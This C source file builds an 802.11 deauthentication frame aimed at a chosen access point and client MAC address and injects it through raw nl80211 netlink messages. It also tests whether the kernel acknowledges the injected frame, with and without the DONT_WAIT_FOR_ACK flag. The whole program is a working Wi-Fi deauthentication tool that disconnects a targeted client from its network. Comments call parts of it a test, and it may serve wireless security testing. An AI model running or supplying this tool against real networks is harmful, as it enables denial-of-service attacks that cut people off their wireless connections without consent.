#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/nl80211.h>
#include <linux/genetlink.h>
#include <net/if.h>
#include <errno.h>
#include <poll.h>

#define NLA_ALIGN(len) (((len) + 3) & ~3)
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#define NLA_OK(nla, remaining) \
    ((remaining) >= (int)sizeof(struct nlattr) && \
     (nla)->nla_len >= sizeof(struct nlattr) && \
     (nla)->nla_len <= (remaining))
#define NLA_NEXT(nla, remaining) \
    ((remaining) -= NLA_ALIGN((nla)->nla_len), \
     (struct nlattr*)(((char*)(nla)) + NLA_ALIGN((nla)->nla_len)))

static int nl80211_family = -1;

static int get_nl80211_family(int sock) {
    struct {
        struct nlmsghdr hdr;
        struct genlmsghdr genl;
        struct nlattr attr;
        char name[16];
    } req = {0};
    
    req.hdr.nlmsg_len = sizeof(req);
    req.hdr.nlmsg_type = GENL_ID_CTRL;
    req.hdr.nlmsg_flags = NLM_F_REQUEST;
    req.hdr.nlmsg_seq = 1;
    req.genl.cmd = CTRL_CMD_GETFAMILY;
    req.hdr.nlmsg_pid = getpid();
    req.attr.nla_type = CTRL_ATTR_FAMILY_NAME;
    req.attr.nla_len = sizeof(req.attr) + 8;
    strcpy(req.name, "nl80211");
    req.hdr.nlmsg_len = sizeof(req.hdr) + sizeof(req.genl) + req.attr.nla_len;
    
    send(sock, &req, req.hdr.nlmsg_len, 0);
    
    unsigned char resp[4096];
    int len = recv(sock, resp, sizeof(resp), 0);
    if (len < 0) return -1;
    
    struct nlmsghdr *hdr = (struct nlmsghdr*)resp;
    if (hdr->nlmsg_type == NLMSG_ERROR) return -1;
    
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    struct nlattr *attr = (struct nlattr*)(genl + 1);
    int remaining = hdr->nlmsg_len - sizeof(*hdr) - sizeof(*genl);
    
    while (NLA_OK(attr, remaining)) {
        if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
            return *(int*)(attr + 1);
        }
        attr = NLA_NEXT(attr, remaining);
    }
    return -1;
}

// Query nl80211 supported features
static void query_features(int sock, int ifidx) {
    unsigned char buf[512];
    memset(buf, 0, sizeof(buf));
    
    struct nlmsghdr *hdr = (struct nlmsghdr*)buf;
    hdr->nlmsg_type = nl80211_family;
    hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
    hdr->nlmsg_seq = 2;
    hdr->nlmsg_pid = getpid();
    
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    genl->cmd = NL80211_CMD_GET_INTERFACE;
    
    unsigned char *ptr = (unsigned char*)(genl + 1);
    struct nlattr *a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_IFINDEX;
    a->nla_len = sizeof(*a) + 4;
    *(int*)(a + 1) = ifidx;
    ptr += a->nla_len;
    
    hdr->nlmsg_len = ptr - buf;
    send(sock, buf, hdr->nlmsg_len, 0);
    
    unsigned char resp[4096];
    int len = recv(sock, resp, sizeof(resp), 0);
    if (len < 0) {
        printf("FEATURES recv failed: %s\n", strerror(errno));
        return;
    }
    
    hdr = (struct nlmsghdr*)resp;
    if (hdr->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = (struct nlmsgerr*)(hdr+1);
        printf("FEATURES error: %d\n", err->error);
        return;
    }
    
    printf("FEATURES response: type=%d len=%d\n", hdr->nlmsg_type, hdr->nlmsg_len);
    
    genl = (struct genlmsghdr*)(hdr + 1);
    struct nlattr *attr = (struct nlattr*)(genl + 1);
    int remaining = hdr->nlmsg_len - sizeof(*hdr) - sizeof(*genl);
    
    while (NLA_OK(attr, remaining)) {
        int type = attr->nla_type;
        printf("  attr type=%d len=%d\n", type, attr->nla_len);
        attr = NLA_NEXT(attr, remaining);
    }
}

static int send_frame_and_check(int sock, int ifidx, const unsigned char *frame, int flen, 
                                 int freq) {
    unsigned char buf[512];
    memset(buf, 0, sizeof(buf));
    
    struct nlmsghdr *hdr = (struct nlmsghdr*)buf;
    hdr->nlmsg_type = nl80211_family;
    hdr->nlmsg_flags = NLM_F_REQUEST;  // NO DONT_WAIT_FOR_ACK - we WANT the ack
    hdr->nlmsg_seq = 3;
    hdr->nlmsg_pid = getpid();
    
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    genl->cmd = NL80211_CMD_FRAME;
    
    unsigned char *ptr = (unsigned char*)(genl + 1);
    
    struct nlattr *a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_IFINDEX;
    a->nla_len = sizeof(*a) + 4;
    *(int*)(a + 1) = ifidx;
    ptr += a->nla_len;
    
    a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_WIPHY_FREQ;
    a->nla_len = sizeof(*a) + 4;
    *(int*)(a + 1) = freq;
    ptr += a->nla_len;
    
    a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_FRAME;
    a->nla_len = sizeof(*a) + flen;
    memcpy(a + 1, frame, flen);
    ptr += a->nla_len;
    
    // Note: NO DONT_WAIT_FOR_ACK — we want to read the error response
    
    hdr->nlmsg_len = ptr - buf;
    
    int ret = send(sock, buf, hdr->nlmsg_len, 0);
    if (ret <= 0) {
        printf("  send FAILED: %s\n", strerror(errno));
        return -1;
    }
    printf("  send() returned %d — now reading nl80211 response...\n", ret);
    
    // Read the nl80211 response (ack or error)
    unsigned char resp[4096];
    struct pollfd pfd = {.fd = sock, .events = POLLIN};
    int pr = poll(&pfd, 1, 2000);  // 2 second timeout
    
    if (pr <= 0) {
        printf("  poll timeout/error: %s\n", pr == 0 ? "timeout" : strerror(errno));
        return pr;
    }
    
    int len = recv(sock, resp, sizeof(resp), 0);
    if (len < 0) {
        printf("  recv FAILED: %s\n", strerror(errno));
        return -1;
    }
    
    hdr = (struct nlmsghdr*)resp;
    printf("  response: type=%d flags=0x%x seq=%d pid=%d len=%d\n",
           hdr->nlmsg_type, hdr->nlmsg_flags, hdr->nlmsg_seq, hdr->nlmsg_pid, hdr->nlmsg_len);
    
    if (hdr->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = (struct nlmsgerr*)(hdr + 1);
        printf("  NLMSG_ERROR: error=%d (%s)\n", err->error, 
               err->error ? strerror(-err->error) : "ACK (success)");
        return err->error;
    }
    
    printf("  type is not NLMSG_ERROR — treating as success\n");
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 5) {
        fprintf(stderr, "Usage: %s <iface> <ap_mac> <client_mac> <freq>\n", argv[0]);
        return 1;
    }
    
    const char *iface = argv[1];
    int freq = atoi(argv[4]);
    int reason = 7;
    
    unsigned char ap[6], cl[6];
    for (int i = 0; i < 6; i++) {
        sscanf(argv[2] + i*3, "%2hhx:", &ap[i]);
        sscanf(argv[3] + i*3, "%2hhx:", &cl[i]);
    }
    
    // Deauth frame
    unsigned char frame[] = {
        0xC0, 0x00, 0x3A, 0x01,
        0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
        0,0, 0,0
    };
    memcpy(frame+4, cl, 6); memcpy(frame+10, ap, 6); memcpy(frame+16, ap, 6);
    frame[22] = reason & 0xFF;
    frame[23] = (reason >> 8) & 0xFF;
    
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (sock < 0) { perror("socket"); return 1; }
    
    struct sockaddr_nl sa = {.nl_family = AF_NETLINK, .nl_pid = getpid()};
    bind(sock, (struct sockaddr*)&sa, sizeof(sa));
    
    nl80211_family = get_nl80211_family(sock);
    printf("nl80211 family: %d\n", nl80211_family);
    
    int ifidx = if_nametoindex(iface);
    printf("ifindex for %s: %d\n", iface, ifidx);
    
    printf("\n=== Testing frame injection with ACK ===\n");
    printf("Target: %s -> %s on freq %d\n", argv[2], argv[3], freq);
    
    int result = send_frame_and_check(sock, ifidx, frame, sizeof(frame), freq);
    printf("\n=== Result: %d ===\n", result);
    
    if (result == 0) {
        printf("SUCCESS: nl80211 ACK'd the frame — it SHOULD be in the air!\n");
    } else if (result < 0) {
        printf("FAILED: nl80211 returned error %d\n", result);
    }
    
    // Now try a second frame with DONT_WAIT_FOR_ACK (like the original code)
    printf("\n=== Testing with DONT_WAIT_FOR_ACK (original method) ===\n");
    // Same frame but with DONT_WAIT_FOR_ACK
    unsigned char buf2[512];
    memset(buf2, 0, sizeof(buf2));
    struct nlmsghdr *hdr2 = (struct nlmsghdr*)buf2;
    hdr2->nlmsg_type = nl80211_family;
    hdr2->nlmsg_flags = NLM_F_REQUEST;
    hdr2->nlmsg_seq = 4;
    hdr2->nlmsg_pid = getpid();
    
    struct genlmsghdr *genl2 = (struct genlmsghdr*)(hdr2 + 1);
    genl2->cmd = NL80211_CMD_FRAME;
    
    unsigned char *ptr2 = (unsigned char*)(genl2 + 1);
    
    struct nlattr *a2 = (struct nlattr*)ptr2;
    a2->nla_type = NL80211_ATTR_IFINDEX;
    a2->nla_len = sizeof(*a2) + 4;
    *(int*)(a2 + 1) = ifidx;
    ptr2 += a2->nla_len;
    
    a2 = (struct nlattr*)ptr2;
    a2->nla_type = NL80211_ATTR_WIPHY_FREQ;
    a2->nla_len = sizeof(*a2) + 4;
    *(int*)(a2 + 1) = freq;
    ptr2 += a2->nla_len;
    
    a2 = (struct nlattr*)ptr2;
    a2->nla_type = NL80211_ATTR_FRAME;
    a2->nla_len = sizeof(*a2) + sizeof(frame);
    memcpy(a2 + 1, frame, sizeof(frame));
    ptr2 += a2->nla_len;
    
    a2 = (struct nlattr*)ptr2;
    a2->nla_type = NL80211_ATTR_DONT_WAIT_FOR_ACK;
    a2->nla_len = sizeof(*a2);
    ptr2 += a2->nla_len;
    
    hdr2->nlmsg_len = ptr2 - buf2;
    
    int ret2 = send(sock, buf2, hdr2->nlmsg_len, 0);
    printf("send() returned %d\n", ret2);
    
    // Try to read any async error
    struct pollfd pfd2 = {.fd = sock, .events = POLLIN};
    int pr2 = poll(&pfd2, 1, 500);
    if (pr2 > 0) {
        unsigned char resp2[4096];
        int len2 = recv(sock, resp2, sizeof(resp2), 0);
        printf("Got late response: %d bytes\n", len2);
        struct nlmsghdr *h = (struct nlmsghdr*)resp2;
        if (h->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *e = (struct nlmsgerr*)(h+1);
            printf("  error=%d\n", e->error);
        }
    } else {
        printf("No async response (poll returned %d)\n", pr2);
    }
    
    close(sock);
    return 0;
}
